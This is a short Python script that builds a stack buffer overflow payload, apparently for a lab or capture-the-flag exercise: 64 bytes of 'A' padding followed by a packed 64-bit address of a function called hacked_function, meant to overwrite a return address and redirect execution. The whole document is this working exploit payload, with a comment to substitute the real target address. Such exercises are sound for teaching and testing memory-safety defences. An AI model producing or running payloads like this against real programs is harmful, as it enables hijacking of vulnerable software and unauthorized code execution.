import struct

buffer_size = 50  # Size of the vulnerable buffer
padding = 64      # Padding to reach the return address
hacked_function_address = 0x555555555169  # Replace with the actual address of hacked_function

payload = b"A" * padding + struct.pack("<Q", hacked_function_address)

print(payload)
